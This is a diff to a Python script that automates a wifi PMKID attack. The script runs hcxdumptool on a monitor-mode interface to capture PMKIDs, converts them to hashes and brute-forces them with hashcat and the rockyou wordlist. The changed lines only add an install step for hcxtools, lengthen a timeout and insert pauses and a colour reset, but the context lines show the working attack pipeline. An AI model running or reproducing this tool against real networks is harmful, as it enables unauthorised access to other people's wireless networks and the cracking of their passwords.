@@ -98,6 +98,7 @@ def check_deps():
         get_colours("\nInstalling [hcxdumpTool]....", "magenta")
         install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
                                          text=True)
+        subprocess.run(["sudo", "apt", "install", "hcxtools"])
         if "Setting up hcxdumptool" in install_hcxdump.stdout:
             get_colours("\n[*] hcxdumpTool Installed...", "blue")
             program_status = True
@@ -162,9 +163,10 @@ def attack_func(network_interface, attack_mode):
         try:
             subprocess.run(
                 ["sudo hcxdumptool -i " + network_interface + "mon --enable_status=1 -o Capture_PKMID"], shell=True,
-                timeout=10)
+                timeout=20)
         except subprocess.TimeoutExpired:
             get_colours("\nClearing Temporary files..", "red")
+            print(Fore.WHITE)
             time.sleep(3)
             get_colours("", "yellow")
             subprocess.run(["clear"])
@@ -172,6 +174,7 @@ def attack_func(network_interface, attack_mode):
                                               capture_output=True, text=True)
             subprocess.run(["clear"])
             get_colours("\nTrying getting hashes", "magenta")
+            time.sleep(2)
             subprocess.run(["rm", "Capture_PKMID"])
             if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
                 get_colours("\nStarting with Brute-Force attack..", "cyan")
@@ -180,6 +183,7 @@ def attack_func(network_interface, attack_mode):
                 subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
                                 "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
             else:
+                time.sleep(1)
                 get_colours("\n[-] no packet captured...", "red")
                 quit_program()
 
